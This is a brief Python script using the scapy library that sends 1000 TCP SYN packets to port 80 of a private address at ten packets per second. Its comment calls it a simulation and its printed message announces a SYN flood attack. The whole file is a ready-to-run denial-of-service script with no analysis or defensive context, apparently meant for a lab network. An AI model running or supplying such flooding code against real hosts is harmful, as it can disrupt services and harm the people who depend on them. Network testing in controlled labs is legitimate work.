from scapy.all import *

# SYN flood simulation (1 packet every 0.1s = 10 pkt/s)
print("[*] Starting SYN flood attack")
send(
    IP(dst="192.168.1.100")/TCP(dport=80, flags="S"),
    inter=0.1,  # 100ms between packets
    count=1000,   # Total packets to send
    verbose=0
)
